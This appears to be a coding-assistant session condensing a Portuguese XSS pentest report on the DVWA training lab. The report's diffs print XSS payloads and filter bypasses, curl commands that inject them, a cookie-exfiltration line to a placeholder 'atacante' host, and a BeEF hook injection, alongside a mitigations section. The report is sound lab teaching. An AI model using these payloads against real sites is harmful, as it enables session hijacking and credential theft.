+       74 +- **Medium** — Message **blindado** (`strip_tags` + `htmlspeci
+          +alchars`); o elo fraco é o campo `name`, protegido só por `str
+          +_replace('<script>', ...)`. Injeta-se `<img src=x onerror=aler
+          +t(document.cookie)>` no `name`. **[PRINT 5]**                 
+       75 +- **High** — `name` filtrado pela mesma regex anti-*script*. V
+          +etor sem a palavra *script*: `<svg/onload=alert(document.cooki
+          +e)>` (ou `<body onpageshow=...>`). **[PRINT 6]**              
+       76  
+      110 -```bash                                                       
+      111 -curl -s -i 'http://localhost:4280/vulnerabilities/xss_s/' \   
+      112 -  -b 'PHPSESSID=<PHPSESSID>; security=low' \                  
+      113 -  --data-urlencode 'txtName=hax' \                            
+      114 -  --data-urlencode 'mtxMessage=<script>alert(document.cookie)<
+          -/script>' \                                                   
+      115 -  --data-urlencode 'btnSign=Sign Guestbook'                   
+      116 -```                                                           
+      117 -                                                              
+      118 -A tag persiste e executa a cada recarregamento. **[PRINT 4]** 
+      119 -                                                              
+      120 -**Medium** — O campo Message está **blindado** (`strip_tags(ad
+          -dslashes(...))` + `htmlspecialchars`). O elo fraco é o campo `
+          -name`, protegido só por `str_replace('<script>', '', ...)`. In
+          -jeta-se via `name`:                                           
+      121 -                                                              
+      122 -```bash                                                       
+      123 -curl -s -i 'http://localhost:4280/vulnerabilities/xss_s/' \   
+      124 -  -b 'PHPSESSID=<PHPSESSID>; security=medium' \               
+      125 -  --data-urlencode 'txtName=<img src=x onerror=alert(document.
+          -cookie)>' \                                                   
+      126 -  --data-urlencode 'mtxMessage=ok' \                          
+      127 -  --data-urlencode 'btnSign=Sign Guestbook'                   
+      128 -```                                                           
+      129 -                                                              
+      130 -*Por que falha:* mesma *blacklist* literal do Reflected Medium
+          - — `<img>` não contém `<script>`. **[PRINT 5]**               
+      131 -                                                              
+      132 -**High** — `name` filtrado pela mesma regex de *script* do Ref
+          -lected High. Vetor sem a palavra *script*:                    
+      133 -                                                              
+      134 -```bash                                                       
+      135 -curl -s -i 'http://localhost:4280/vulnerabilities/xss_s/' \   
+      136 -  -b 'PHPSESSID=<PHPSESSID>; security=high' \                 
+      137 -  --data-urlencode 'txtName=<svg/onload=alert(document.cookie)
+          ->' \                                                          
+      138 -  --data-urlencode 'mtxMessage=ok' \                          
+      139 -  --data-urlencode 'btnSign=Sign Guestbook'                   
+      140 -```                                                           
+      141 -                                                              
+      142 -*Por que falha:* a regex ignora `<svg>` e o handler `onload`. 
+          -Equivalentes: `<body onpageshow=...>`, `<iframe onload=...>`. 
+          -**[PRINT 6]**                                                 
+      143 -                                                              
+       77  ### 5.4 DOM-based XSS (`xss_d`)
+       78  
+       79  Type-0: *source* = `location.href`, *sink* = `document.write`.
+            O dado nunca precisa trafegar de volta do servidor.
+       80  
+       81  ```javascript
+      149 -var lang = document.location.href.substring(document.location.
+          -href.indexOf("default=")+8);                                  
+       82 +var lang = location.href.substring(location.href.indexOf("defa
+          +ult=")+8);                                                    
+       83  document.write("<option value='" + lang + "'>" + decodeURI(lan
+           g) + "</option>");
+       84  ```
+       85  
+      153 -**Low** — Sem filtro. O `<script>` injetado é escrito no DOM d
+          -urante o parsing e executa. (Não reproduzível por `curl`, pois
+          - o sink é 100% client-side.)                                  
+       86 +- **Low** — sem filtro; `?default=<script>alert(document.cooki
+          +e)</script>` é escrito no DOM e executa. (Não reproduzível por
+          + `curl` — sink 100% client-side.) **[PRINT 7]**               
+       87 +- **Medium** — filtro server-side `stripos($default, '<script'
+          +)` redireciona. *Bypass* sem `<script>`, quebrando o contexto:
+          + `?default=</option></select><img src=x onerror=alert(document
+          +.cookie)>`. **[PRINT 8]**                                     
+       88 +- **High** — *whitelist* server-side (`French/English/German/S
+          +panish`). *Bypass* pelo **fragmento `#`**, que por especificaç
+          +ão (RFC 3986) nunca é enviado ao servidor: `?default=English#<
+          +script>alert(document.cookie)</script>`. O servidor vê só `def
+          +ault=English`; o JS lê `location.href` inteira. Defesa server-
+          +side é estruturalmente incapaz de proteger um sink que não dep
+          +ende dela — e nenhum log server-side vê o payload (relação dir
+          +eta com a meta "sem ser detectado"). **[PRINT 9]**            
+       89  
+      155 -```                                                           
+      156 -http://localhost:4280/vulnerabilities/xss_d/?default=<script>a
+          -lert(document.cookie)</script>                                
+      157 -```                                                           
+      158 -**[PRINT 7]**                                                 
+       90 +> **Nota:** alguns navegadores percent-encodam `<`/`>` no frag
+          +mento (`%3Cscript%3E`); como o sink usa `decodeURI()` (que não
+          + reverte `%3C`), o `alert` pode não disparar. Cole a URL diret
+          +o na barra de endereços; se necessário, valide `location.href`
+          + no Console.                                                  
+       91  
+      160 -**Medium** — Filtro server-side fraco: `stripos($default, '<sc
+          -ript')` redireciona para `?default=English`. Bypass sem `<scri
+          -pt>`, quebrando o contexto `<select>`:                        
+      161 -                                                              
+      162 -```                                                           
+      163 -?default=</option></select><img src=x onerror=alert(document.c
+          -ookie)>                                                       
+      164 -```                                                           
+      165 -                                                              
+      166 -*Por que falha:* o filtro só procura a substring `<script`; `<
+          -img onerror>` não a contém, e `</option></select>` libera o `<
+          -img>` para ser parseado como elemento válido. **[PRINT 8]**   
+      167 -                                                              
+      168 -**High** — *Whitelist* server-side (`French/English/German/Spa
+          -nish`). Bypass pelo **fragmento `#`**, que por especificação (
+          -RFC 3986) nunca é enviado ao servidor:                        
+      169 -                                                              
+      170 -```                                                           
+      171 -?default=English#<script>alert(document.cookie)</script>      
+      172 -```                                                           
+      173 -                                                              
+      174 -*Por que falha:* o servidor vê apenas `default=English` (válid
+          -o), mas o JavaScript lê `location.href` **inteira**, incluindo
+          - o fragmento. Proteções server-side são estruturalmente incapa
+          -zes de defender um sink que não depende delas — e nenhum WAF/l
+          -og server-side vê o payload (relação direta com a meta de "sem
+          - ser detectado"). **[PRINT 9]**                               
+      175 -                                                              
+      176 -> **Nota sobre encoding do fragmento:** em alguns navegadores 
+          -modernos, `< >` no fragmento são percent-encodados em `locatio
+          -n.href` (`%3Cscript%3E`). Como o sink aplica `decodeURI()`, o 
+          -`<script>` costuma ser reconstruído e executar. Caso o `alert`
+          - não dispare, valide no Console que `decodeURI(location.hash)`
+          - reconstrói a tag, ou utilize um vetor que não dependa de `< >
+          -` no fragmento. O payload acima permanece como solução esperad
+          -a do DVWA.                                                    
+      177 -                                                              
+       92  ## 6. Análise de Segurança
+       93  
+       94  ### 6.1 Interpretação e Impacto
+       95  
+      182 -Todos os vetores demonstrados levam ao mesmo resultado: **exec
+          -ução de JavaScript arbitrário na origem do DVWA com a sessão d
+          -a vítima**. Os cenários de impacto incluem:                   
+       96 +Todos os vetores levam ao mesmo resultado: **execução de JavaS
+          +cript arbitrário na origem do DVWA com a sessão da vítima**. C
+          +enários de impacto:                                           
+       97  
+      184 -- **Roubo de cookie e sequestro de sessão:** o payload lê `doc
+          -ument.cookie` e exfiltra o `PHPSESSID` (ex.: `new Image().src=
+          -'http://atacante/c?'+document.cookie`); o atacante reimporta o
+          - cookie e assume a sessão autenticada sem senha.              
+       98 +- **Roubo de cookie / sequestro de sessão:** `new Image().src=
+          +'http://atacante/c?'+document.cookie` exfiltra o `PHPSESSID`; 
+          +o atacante reimporta o cookie e assume a sessão autenticada se
+          +m senha.                                                      
+       99  - **Keylogging:** captura de teclas em formulários de login vi
+           a `addEventListener('keydown', ...)`.
+      186 -- **Defacement e phishing:** reescrita do DOM e injeção de for
+          -mulários de login falsos sobre o domínio legítimo (com cadeado
+          - HTTPS válido), elevando a taxa de sucesso da coleta de creden
+          -ciais.                                                        
+      187 -- **Propagação (worm) no Stored XSS:** o payload persiste e ex
+          -ecuta para todo visitante, podendo se auto-replicar.          
+      188 -- **Ações forjadas (XSS + CSRF):** rodando no contexto autenti
+          -cado, o script lê o próprio token CSRF da página antes de subm
+          -eter requisições privilegiadas, contornando proteções anti-CSR
+          -F baseadas em token.                                          
+      100 +- **Defacement / phishing:** reescrita do DOM e injeção de log
+          +in falso sobre o domínio legítimo (com HTTPS válido).         
+      101 +- **Propagação (worm):** no Stored, o payload persiste e execu
+          +ta para todo visitante, podendo se auto-replicar.             
+      102 +- **Ações forjadas (XSS + CSRF):** rodando no contexto autenti
+          +cado, o script lê o próprio token CSRF da página antes de subm
+          +eter requisições privilegiadas.                               
+      103  
+      190 -A lição transversal é que **blacklists são insuficientes por c
+          -onstrução**: `str_replace` cai com variação de caixa, tag alte
+          -rnativa ou aninhamento; `preg_replace` mirando *script* ignora
+          - todo o universo de *event handlers* e tags; e filtros server-
+          -side são impotentes contra DOM XSS via fragmento.             
+      104 +A lição transversal: **blacklists são insuficientes por constr
+          +ução** — `str_replace` cai com variação de caixa, tag alternat
+          +iva ou aninhamento; a regex anti-*script* ignora todo o univer
+          +so de *event handlers*; e filtros server-side são impotentes c
+          +ontra DOM XSS via fragmento.                                  
+      105  
+      106  ### 6.2 Mitigações
+      107  
+      108  | Mitigação | Função |
+      109  |---|---|
+      196 -| **Output encoding contextual** | Defesa primária. Codificar 
+          -a saída conforme o contexto (corpo HTML, atributo, JS, URL, CS
+          -S). `htmlspecialchars()` converte `< > " & '` em entidades, ne
+          -utralizando o payload. |                                      
+      197 -| **Validação por allowlist** | Aceitar apenas valores/formato
+          -s permitidos (tipo, tamanho, charset). Complementa, não substi
+          -tui, o encoding. |                                            
+      198 -| **Content Security Policy (CSP)** | CSP estrita com `nonce` 
+          -por requisição (`script-src 'nonce-...' 'strict-dynamic'`), se
+          -m `unsafe-inline`. Defesa em profundidade. |                  
+      199 -| **Trusted Types** | `require-trusted-types-for 'script'` for
+          -ça sinks perigosos (`innerHTML`, `document.write`, `eval`) a r
+          -ejeitar strings cruas — elimina classes inteiras de DOM XSS. |
+      200 -| **DOMPurify** | Sanitização de HTML rico (editores WYSIWYG) 
+          -onde o encoding quebraria a funcionalidade. |                 
+      201 -| **Cookies HttpOnly / Secure / SameSite** | `HttpOnly` impede
+          - a leitura via `document.cookie`, neutralizando o roubo direto
+          - de sessão demonstrado. |                                     
+      202 -| **X-XSS-Protection (descontinuado)** | Filtro legado, removi
+          -do dos navegadores modernos; não confiar nele. Preferir CSP. |
+      110 +| **Output encoding contextual** | Defesa primária. Codificar 
+          +a saída conforme o contexto (HTML, atributo, JS, URL). `htmlsp
+          +ecialchars()` converte `< > " & '` em entidades, neutralizando
+          + o payload. |                                                 
+      111 +| **Validação por allowlist** | Aceitar apenas valores/formato
+          +s esperados. Complementa, não substitui, o encoding. |        
+      112 +| **Content Security Policy** | CSP estrita com `nonce` por re
+          +quisição (`script-src 'nonce-…' 'strict-dynamic'`), sem `unsaf
+          +e-inline`. Defesa em profundidade. |                          
+      113 +| **Trusted Types** | `require-trusted-types-for 'script'` for
+          +ça sinks perigosos (`innerHTML`, `document.write`) a rejeitar 
+          +strings cruas — elimina classes de DOM XSS. |                 
+      114 +| **DOMPurify** | Sanitização de HTML rico onde o encoding que
+          +braria a funcionalidade. |                                    
+      115 +| **HttpOnly / Secure / SameSite** | `HttpOnly` impede a leitu
+          +ra via `document.cookie`, neutralizando o roubo direto de sess
+          +ão. |                                                         
+      116  
+      204 -### 6.3 O Nível Impossible como Referência de Correção        
+      117 +### 6.3 O Nível Impossible como Referência                    
+      118  
+      206 -O nível **Impossible** abandona a filtragem por blacklist e ad
+          -ota **encoding de saída sensível ao contexto**, robusto por nã
+          -o depender de prever cada vetor:                              
+      119 +O Impossible abandona a *blacklist* e adota **encoding de saíd
+          +a sensível ao contexto**, robusto por não depender de prever c
+          +ada vetor. Em **Reflected/Stored**, aplica `htmlspecialchars()
+          +` na entrada e na renderização (a `dvwaGuestbook` só codifica 
+          +quando o nível é Impossible), tornando qualquer tag texto iner
+          +te, somado a um **token anti-CSRF**. Em **DOM**, a correção é 
+          +client-side: remove-se o `decodeURI()` do sink, de modo que o 
+          +`%3Cscript%3E` chega ao `document.write` sem ser decodificado,
+          + tratado como texto literal.                                  
+      120  
+      208 -- **Reflected/Stored:** `htmlspecialchars()` aplicado tanto no
+          - tratamento da **entrada** quanto na **renderização** — no Sto
+          -red, a rotina `dvwaGuestbook` só aplica `htmlspecialchars` qua
+          -ndo o nível é Impossible, tornando qualquer tag texto inerte. 
+          -Soma-se um **token anti-CSRF** (`checkToken`) que impede submi
+          -ssões forjadas.                                               
+      209 -- **DOM:** a correção é necessariamente **client-side** — remo
+          -ve-se o `decodeURI()` do sink, de modo que o `%3Cscript%3E` pe
+          -rcent-encoded (gerado pelo browser em `location.href`) chega a
+          -o `document.write` **sem ser decodificado**, sendo tratado com
+          -o texto literal. O ideal é evitar sinks perigosos por completo
+          -, usando `document.createElement` + `element.text`/`value`.   
+      210 -                                                              
+      121  ### 6.4 Demonstração de Impacto com BeEF
+      122  
+      213 -> Detalhamento operacional, comando de *hook* e fluxo no paine
+          -l: ver **Anexo B**. Resumo: a partir do Stored XSS (Low), inje
+          -ta-se o *hook* do BeEF; ao abrir o guestbook, o navegador-víti
+          -ma aparece como *hooked* no painel e permite módulos como *Hos
+          -t > Get Cookies*, demonstrando que o impacto só é possível pel
+          -a ausência de output encoding, CSP e flag `HttpOnly`.         
+      123 +A partir do Stored XSS (Low) injeta-se o *hook* do BeEF (`<scr
+          +ipt src="http://<IP>:3000/hook.js"></script>`, contornando o `
+          +maxlength` via `curl`). Ao abrir o guestbook, o navegador-víti
+          +ma aparece como *hooked* no painel e o módulo *Host → Get Cook
+          +ies* captura a sessão — demonstrando que o impacto só é possív
+          +el pela ausência de output encoding, CSP e flag `HttpOnly`. (P
+          +rocedimento completo no guia operacional; uso restrito a este 
+          +laboratório autorizado.)                                      
+      124  
+      125  ## 7. Conclusão
+      126  
+      217 -A análise confirmou a presença de XSS exploável nos três módul
+          -os do DVWA (Reflected, Stored e DOM-based) em todos os níveis 
+          -Low, Medium e High, evidenciando uma progressão didática clara
+          -: **a ausência de filtro** (Low) dá lugar a **blacklists ingên
+          -uas** (Medium/High) que são contornadas com vetores triviais —
+          - tags alternativas, *event handlers*, variação de caixa, aninh
+          -amento e, no caso DOM, o fragmento de URL que jamais alcança o
+          - servidor.                                                    
+      127 +A análise confirmou XSS exploável nos três módulos (Reflected,
+          + Stored, DOM-based) em todos os níveis Low, Medium e High, com
+          + progressão didática clara: a **ausência de filtro** (Low) dá 
+          +lugar a **blacklists ingênuas** (Medium/High), contornadas com
+          + vetores triviais — tags alternativas, *event handlers*, varia
+          +ção de caixa, aninhamento e, no DOM, o fragmento de URL que ja
+          +mais alcança o servidor.                                      
+      128  
+      219 -O aprendizado central é conceitual: defender-se de XSS **não**
+          - é enumerar e remover o que parece perigoso, mas **codificar t
+          -oda saída conforme seu contexto**, tratando entrada do usuário
+          - sempre como dado. O nível Impossible materializa essa virada 
+          -— `htmlspecialchars()` no input e na renderização, ausência de
+          - `decodeURI()` no sink DOM e token anti-CSRF — e serve de refe
+          -rência de código seguro por padrão, idealmente reforçado por C
+          -SP estrita, Trusted Types e cookies `HttpOnly/SameSite`.      
+      129 +O aprendizado central é conceitual: defender-se de XSS **não**
+          + é enumerar e remover o que parece perigoso, mas **codificar t
+          +oda saída conforme seu contexto**, tratando entrada como dado.
+          + O nível Impossible materializa essa virada e serve de referên
+          +cia de código seguro por padrão, idealmente reforçado por CSP 
+          +estrita, Trusted Types e cookies `HttpOnly/SameSite`. Como lim
+          +itação, o DVWA é propositalmente simplificado (sinks diretos, 
+          +provas com `alert()` em vez de exfiltração real), mas a mecâni
+          +ca de exploração e de defesa é diretamente transponível para p
+          +rodução.                                                      
+      130  
+      221 -Como limitação, o DVWA é um ambiente propositalmente simplific
+          -ado: os sinks são diretos e os payloads de prova usam `alert()
+          -` em vez de exfiltração real. Ainda assim, a mecânica de explo
+          -ração e, sobretudo, das defesas é diretamente transponível par
+          -a aplicações de produção, cumprindo o objetivo pedagógico da a
+          -tividade.                                                     
+      222 -                                                              
+      131  ### Referências
+      132  
+      225 -- OWASP — Cross-Site Scripting Prevention Cheat Sheet: https:/
+          -/cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_P
+          -revention_Cheat_Sheet.html                                    
+      133 +- OWASP — XSS Prevention Cheat Sheet: https://cheatsheetseries
+          +.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_S
+          +heet.html                                                     
+      134  - OWASP — DOM-based XSS Prevention Cheat Sheet: https://cheats
+           heetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Chea
+           t_Sheet.html
+      135  - MDN — Content Security Policy (CSP): https://developer.mozil
+           la.org/en-US/docs/Web/HTTP/Guides/CSP
+      136  - MDN — Trusted Types API: https://developer.mozilla.org/en-US
+           /docs/Web/API/Trusted_Types_API
+      137  - DOMPurify: https://github.com/cure53/DOMPurify
+      138  - BeEF Project: https://beefproject.com/
+      231 -                                                              
+      232 ----                                                           
+      233 -                                                              
+      234 -## Anexo A — Evidências Visuais                               
+      235 -                                                              
+      236 -| Print | Vetor correspondente |                              
+      237 -|---|---|                                                     
+      238 -| [PRINT 1] | Reflected Low — `<script>alert(document.cookie)<
+          -/script>` |                                                   
+      239 -| [PRINT 2] | Reflected Medium — `<img src=x onerror=alert(doc
+          -ument.cookie)>` |                                             
+      240 -| [PRINT 3] | Reflected High — `<svg/onload=alert(document.coo
+          -kie)>` |                                                      
+      241 -| [PRINT 4] | Stored Low — `<script>alert(document.cookie)</sc
+          -ript>` |                                                      
+      242 -| [PRINT 5] | Stored Medium — `<img src=x onerror=alert(docume
+          -nt.cookie)>` (campo `name`) |                                 
+      243 -| [PRINT 6] | Stored High — `<svg/onload=alert(document.cookie
+          -)>` (campo `name`) |                                          
+      244 -| [PRINT 7] | DOM Low — `?default=<script>alert(document.cooki
+          -e)</script>` |                                                
+      245 -| [PRINT 8] | DOM Medium — `</option></select><img src=x onerr
+          -or=alert(document.cookie)>` |                                 
+      246 -| [PRINT 9] | DOM High — `English#<script>alert(document.cooki
+          -e)</script>` |                                                
+      247 -                                                              
+      248 -## Anexo B — Procedimento BeEF (Demonstração de Impacto)      
+      249 -                                                              
+      250 -> **AVISO:** executar somente neste laboratório DVWA controlad
+          -o, isolado (bind `127.0.0.1`) e com autorização explícita do p
+          -rofessor; jamais contra terceiros.                            
+      251 -                                                              
+      252 -A partir do Stored XSS (Low), injeta-se o *hook* do BeEF (cont
+          -ornando o `maxlength` client-side via `curl`):                
+      253 -                                                              
+      254 -```bash                                                       
+      255 -curl 'http://localhost:4280/vulnerabilities/xss_s/' \         
+      256 -  -b 'PHPSESSID=<sess>; security=low' \                       
+      257 -  --data-urlencode 'txtName=lab' \                            
+      258 -  --data-urlencode 'mtxMessage=<script src="http://<IP>:3000/h
+          -ook.js"></script>' \                                          
+      259 -  --data 'btnSign=Sign Guestbook'                             
+      260 -```                                                           
+      261 -                                                              
+      262 -Ao abrir o guestbook, o navegador-vítima carrega `hook.js`, ap
+          -arece como *hooked* no painel BeEF (`http://<IP>:3000/ui/panel
+          -`) e permite módulos como *Host > Get Cookies* — demonstrando 
+          -que o impacto só é possível pela ausência de output encoding, 
+          -CSP e flag `HttpOnly`.                                        
+      139   No newline at end of file
+
+● Relatório condensado. Medindo a redução:
+
+● PowerShell($f='C:\www\DVWA\relatorio-xss-dvwa.md'
+            $t=Get-Content -Raw $f…)
+  ⎿  novo: 12109 chars, 139 linhas
+     reducao: 33% vs original (18187 -> 12109 chars)
+
+● Cortado 33% (262→139 linhas, 18.2k→12.1k chars). Texto sozinho deve cair de 11
+  → ~7 páginas.
+
+  Mas atenção — o real vilão agora são os PRINTS. Suas 11 páginas eram só texto
+  (os [PRINT N] são marcadores de 1 linha). Como o limite de 8 inclui as
+  evidências, 9 screenshots vão estourar de novo: ~7 pág de texto + 9 prints >
+  8.
+
+  Maior alavanca: consolidar os 9 prints em 3 (um composto por tipo —
+  Reflected/Stored/DOM — cada um mostrando os 3 alerts Low/Med/High lado a
+  lado). Cai de ~3-4 páginas de imagem pra ~1.
+
+  Como quer atacar?
+
+● User answered Claude's questions:
+  ⎿  · Texto já caiu pra ~7 páginas. Como resolver o espaço dos prints pra 
+     fechar ≤8? → Os dois
+
+❯ /usage 
+  ⎿  Settings dialog dismissed
+
+● "Os dois". Consolido prints em 3 compostos (1 por tipo) e corto texto mais
+  fundo (fundo as subseções na matriz, encurto impacto e BeEF). Reescrevendo:
+
+● Write(relatorio-xss-dvwa.md)
+  ⎿  Added 38 lines, removed 67 lines
+       16  
+       17  ## 1. Introdução
+       18  
+       19 -Este relatório documenta uma atividade de *pentest* conduzida 
+          -sobre a aplicação **DVWA** (Damn Vulnerable Web Application), 
+          -ambiente web propositalmente vulnerável usado para fins didáti
+          -cos. O foco exclusivo foi **Cross-Site Scripting (XSS)** — fal
+          -ha que ocorre quando a aplicação incorpora dados controlados p
+          -elo usuário na resposta sem validação ou codificação adequada,
+          - permitindo a execução de JavaScript arbitrário no navegador d
+          -a vítima.                                                     
+       19 +Este relatório documenta uma atividade de *pentest* sobre a ap
+          +licação **DVWA** (Damn Vulnerable Web Application), ambiente w
+          +eb propositalmente vulnerável usado para fins didáticos. O foc
+          +o exclusivo foi **Cross-Site Scripting (XSS)** — falha que oco
+          +rre quando a aplicação incorpora dados do usuário na resposta 
+          +sem validação ou codificação adequada, permitindo a execução d
+          +e JavaScript arbitrário no navegador da vítima. É uma das falh
+          +as mais persistentes em aplicações web (histórico no OWASP Top
+          + 10) por derivar de um erro conceitual simples: tratar **entra
+          +da do usuário como código** em vez de **dado**. O ambiente rod
+          +a em Docker, exposto em `http://localhost:4280` (bind `127.0.0
+          +.1`, isolado), com níveis de segurança ajustáveis (Low, Medium
+          +, High, Impossible) na aba *DVWA Security*.                   
+       20  
+       21 -O XSS é uma das falhas mais persistentes em aplicações web (hi
+          -stórico no OWASP Top 10) por derivar de um erro conceitual sim
+          -ples: tratar **entrada do usuário como código** em vez de **da
+          -do**. As consequências vão de roubo de sessão e *defacement* a
+          - campanhas de *phishing* hospedadas no próprio domínio legítim
+          -o. O ambiente analisado roda em Docker, exposto localmente em 
+          -`http://localhost:4280` (bind `127.0.0.1`, isolado), com nívei
+          -s de segurança ajustáveis (Low, Medium, High, Impossible) na a
+          -ba *DVWA Security*.                                           
+       22 -                                                              
+       21  ## 2. Objetivos da Análise
+       22  
+       23  - **Identificar** os pontos vulneráveis a XSS nos três módulos
+           : Reflected (`xss_r`), Stored (`xss_s`) e DOM-based (`xss_d`).
+       26 -- **Compreender** o comportamento da interface diante de entra
+          -das maliciosas e como cada nível tenta (e falha em) filtrar pa
+          -yloads.                                                       
+       24 +- **Compreender** como cada nível tenta (e falha em) filtrar p
+          +ayloads.                                                      
+       25  - **Avaliar** o impacto da execução de scripts no client-side 
+           — roubo de cookies, sequestro de sessão e ações autenticadas f
+           orjadas.
+       28 -- **Contrastar** defesas por *blacklist* (Medium/High) com a a
+          -bordagem correta de *output encoding* contextual (Impossible).
+       26 +- **Contrastar** defesas por *blacklist* (Medium/High) com *ou
+          +tput encoding* contextual (Impossible).                       
+       27  
+       28  ## 3. Ferramentas Utilizadas
+       29  
+       32 -| Ferramenta | Uso na atividade |                             
+       30 +| Ferramenta | Uso |                                          
+       31  |---|---|
+       32  | **DVWA** (Docker, `localhost:4280`) | Aplicação-alvo vulnerá
+           vel, níveis ajustáveis. |
+       33  | **Navegador + DevTools** | Submissão de payloads; inspeção d
+           o DOM e das requisições. |
+       36 -| **curl** | Evidência bruta da reflexão/persistência no HTML;
+          - *bypass* de `maxlength` (só client-side). |                  
+       37 -| **BeEF** (porta 3000) | Demonstração de impacto pós-exploraç
+          -ão (*hook* do navegador e captura de cookies). |              
+       34 +| **curl** | Evidência da reflexão/persistência no HTML; *bypa
+          +ss* de `maxlength` (só client-side). |                        
+       35 +| **BeEF** (porta 3000) | Demonstração de impacto pós-exploraç
+          +ão (*hook* e captura de cookies). |                           
+       36  
+       37  ## 4. Metodologia Aplicada
+       38  
+       41 -A exploração foi **manual, incremental e controlada**, alinhad
+          -a à restrição de evitar automação massiva. Para cada tipo, per
+          -correu-se a progressão **Low → Medium → High**: (1) leitura do
+          - código-fonte do nível para entender a barreira; (2) construçã
+          -o do *payload* mínimo capaz de contorná-la; (3) submissão via 
+          -URL, formulário ou `curl`; (4) observação do efeito no cliente
+          - e registro da evidência. O critério foi **orientado a impacto
+          -** (demonstrar `document.cookie`). O nível **Impossible** foi 
+          -analisado como referência de correção, não como alvo.         
+       39 +Exploração **manual, incremental e controlada**, evitando auto
+          +mação massiva. Para cada tipo percorreu-se **Low → Medium → Hi
+          +gh**: (1) leitura do código-fonte do nível para entender a bar
+          +reira; (2) construção do *payload* mínimo capaz de contorná-la
+          +; (3) submissão via URL, formulário ou `curl`; (4) observação 
+          +do efeito no cliente. O critério foi **orientado a impacto** (
+          +`document.cookie`). O nível **Impossible** serviu de referênci
+          +a de correção, não de alvo. Comandos `curl` reprodutíveis e o 
+          +procedimento BeEF constam no guia operacional anexo.          
+       40  
+       41  ## 5. Resultados Obtidos
+       42  
+       45 -### 5.1 Matriz de Resultados                                  
+       43 +Confirmou-se XSS exploável nos três módulos em **todos** os ní
+          +veis Low, Medium e High.                                      
+       44  
+       47 -| Tipo | Nível | Payload | Comportamento observado |          
+       45 +| Tipo | Nível | Payload | Por que o filtro falha |           
+       46  |---|---|---|---|
+       49 -| Reflected | Low | `<script>alert(document.cookie)</script>` 
+          -| `alert` dispara; tag refletida literal em `<pre>`. |        
+       50 -| Reflected | Medium | `<img src=x onerror=alert(document.cook
+          -ie)>` | imagem quebrada dispara `onerror`. |                  
+       51 -| Reflected | High | `<svg/onload=alert(document.cookie)>` | `
+          -onload` dispara sem interação. |                              
+       52 -| Stored | Low | `<script>alert(document.cookie)</script>` | e
+          -xecuta a cada visita; persistido no banco. |                  
+       53 -| Stored | Medium | `<img src=x onerror=alert(document.cookie)
+          ->` (`name`) | `onerror` a cada visita; Message blindado. |    
+       54 -| Stored | High | `<svg/onload=alert(document.cookie)>` (`name
+          -`) | `onload` a cada visita; persistente. |                   
+       55 -| DOM | Low | `<script>alert(document.cookie)</script>` | `doc
+          -ument.write` injeta o script; `<select>` quebrado. |          
+       56 -| DOM | Medium | `</option></select><img src=x onerror=alert(d
+          -ocument.cookie)>` | quebra do contexto `<select>` libera o `<i
+          -mg>`. |                                                       
+       57 -| DOM | High | `English#<script>alert(document.cookie)</script
+          ->` | fragmento `#` não vai ao servidor; sink lê `location.href
+          -`. |                                                          
+       47 +| Reflected | Low | `<script>alert(document.cookie)</script>` 
+          +| Sem filtro; concatenado cru em `<pre>`. |                   
+       48 +| Reflected | Medium | `<img src=x onerror=alert(document.cook
+          +ie)>` | `str_replace('<script>')` é literal/case-sensitive; `<
+          +img>` não o contém. |                                         
+       49 +| Reflected | High | `<svg/onload=alert(document.cookie)>` | R
+          +egex mira só *script*; ignora event handlers. |               
+       50 +| Stored | Low | `<script>alert(document.cookie)</script>` (Me
+          +ssage) | Sem codificação de saída; persiste e executa a cada v
+          +isita. |                                                      
+       51 +| Stored | Medium | `<img src=x onerror=alert(document.cookie)
+          +>` (`name`) | Message blindado; campo `name` só remove `<scrip
+          +t>` literal. |                                                
+       52 +| Stored | High | `<svg/onload=alert(document.cookie)>` (`name
+          +`) | `name` usa a mesma regex anti-*script*; `<svg>` passa. | 
+       53 +| DOM | Low | `?default=<script>alert(document.cookie)</script
+          +>` | Sem filtro; `document.write` injeta o script. |          
+       54 +| DOM | Medium | `?default=</option></select><img src=x onerro
+          +r=alert(document.cookie)>` | `stripos('<script')` não vê `<img
+          +>`; quebra o contexto `<select>`. |                           
+       55 +| DOM | High | `?default=English#<script>alert(document.cookie
+          +)</script>` | Fragmento `#` não vai ao servidor; sink lê `loca
+          +tion.href`. |                                                 
+       56  
+       59 -> Evidências `[PRINT 1]` a `[PRINT 9]` inseridas nas subseções
+          - abaixo. Comandos `curl` reprodutíveis e procedimento BeEF det
+          -alhado constam no guia operacional (documento *passo a passo*)
+          -.                                                             
+       57 +**Reflected (`xss_r`)** — o GET `name` é refletido em `<pre>He
+          +llo {name}</pre>`, sem codificação. A progressão evidencia a f
+          +alência da *blacklist*: o `header X-XSS-Protection: 0` desliga
+          + o filtro legado (Low); `<img onerror>` escapa do `str_replace
+          +` literal (Medium); `<svg/onload>` escapa da regex que só busc
+          +a a palavra *script* (High). **[PRINT 1]**                    
+       58  
+       61 -### 5.2 Reflected XSS (`xss_r`)                               
+       59 +**Stored (`xss_s`)** — guestbook persistente; o payload execut
+          +a para **todo** visitante. A renderização (`dvwaGuestbook`) ec
+          +oa `name`/`comment` crus (codifica só no Impossible). O Messag
+          +e é blindado em Medium/High (`strip_tags`+`htmlspecialchars`),
+          + então o campo `name` é o elo fraco. Os limites `maxlength` (1
+          +0/50) são só client-side e ignorados por `curl`/DevTools. **[P
+          +RINT 2]**                                                     
+       60  
+       63 -Parâmetro GET `name` refletido em `<pre>Hello {name}</pre>` — 
+          -contexto de corpo HTML, sem codificação de saída.             
+       61 +**DOM-based (`xss_d`)** — Type-0: *source* = `location.href`, 
+          +*sink* = `document.write`; o dado nunca trafega de volta ao se
+          +rvidor.                                                       
+       62  
+       65 -- **Low** — sem filtro; o `header X-XSS-Protection: 0` ainda d
+          -esliga o filtro legado do navegador. Payload `<script>alert(do
+          -cument.cookie)</script>` chega intacto e executa. **[PRINT 1]*
+          -*                                                             
+       66 -- **Medium** — *blacklist* `str_replace('<script>', '', ...)` 
+          -(case-sensitive, passada única). `<img src=x onerror=alert(doc
+          -ument.cookie)>` não contém a string literal `<script>` e passa
+          -. Equivalentes: `<sCRipt>` (caixa) e `<scr<script>ipt>` (a rem
+          -oção reconstrói `<script>`). **[PRINT 2]**                    
+       67 -- **High** — regex `/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i` mira s
+          -ó a sequência *script*. `<svg/onload=alert(document.cookie)>` 
